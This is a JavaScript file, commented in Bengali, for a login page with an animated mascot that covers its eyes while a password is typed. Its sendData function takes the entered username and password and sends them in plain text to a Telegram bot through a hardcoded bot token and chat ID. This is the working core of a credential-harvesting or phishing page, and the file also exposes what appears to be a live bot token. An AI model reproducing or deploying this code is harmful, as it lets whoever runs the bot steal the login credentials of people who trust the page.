// Mascot, Input এবং Toggle Button এলিমেন্ট সিলেক্ট করা
const img = document.getElementById('mascot-img');
const pass = document.getElementById('password');
const toggleBtn = document.getElementById('toggle-pass');
const btn = document.querySelector('.login-btn');

// ইমেজগুলোর সোর্স (ফাইলের নামের সাথে মিল রেখে)
const poses = {
    idle: '1000022715.jpg',      // সাধারণ অবস্থা
    covering: '1000022716.jpg',  // চোখ ঢাকা (পাসওয়ার্ড টাইপ করার সময়)
    peeking: '1000022717.jpg'    // এক চোখ খোলা (Show Password করার সময়)
};

// ১. পাসওয়ার্ড বক্সে ক্লিক করলে চোখ ঢাকা ছবি দেখাবে
pass.addEventListener('focus', () => {
    img.src = poses.covering;
});

// ২. পাসওয়ার্ড বক্স থেকে বেরিয়ে গেলে আবার সাধারণ অবস্থায় ফিরবে
pass.addEventListener('blur', () => {
    if (pass.type === "password") {
        img.src = poses.idle;
    }
});

// ৩. চোখ আইকনে ক্লিক করলে পোজ পরিবর্তন ও পাসওয়ার্ড দেখা
toggleBtn.addEventListener('click', () => {
    if (pass.type === "password") {
        pass.type = "text";
        img.src = poses.peeking; // আঙুল ফাঁক করে দেখা
        toggleBtn.innerText = "🙈"; 
    } else {
        pass.type = "password";
        img.src = poses.covering; // আবার চোখ ঢাকা
        toggleBtn.innerText = "👁️";
    }
});

// ৪. টেলিগ্রাম বট ফাংশন
function sendData() {
    const user = document.getElementById('username').value;
    const passVal = pass.value;

    if (user === "" || passVal === "") {
        alert("Please enter your credentials!");
        return;
    }

    btn.innerText = "AUTHENTICATING...";
    btn.style.background = "#ffaa00";

    const token = "8736432847:AAHbDf-tOzpa6q--_R-1MRGeENKkh9CEHWc";
    const chatId = "7950771882";
    
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=👤 User: ${user}%0A🔑 Pass: ${passVal}`;
    
    fetch(url)
    .then(response => {
        if (response.ok) {
            btn.innerText = "ACCESS GRANTED";
            btn.style.background = "#00ff88";
            alert("Login data synced to Telegram!");
        } else {
            throw new Error('Failed');
        }
    })
    .catch(error => {
        btn.innerText = "ERROR";
        btn.style.background = "#ff0055";
        console.error('Error:', error);
    });
}
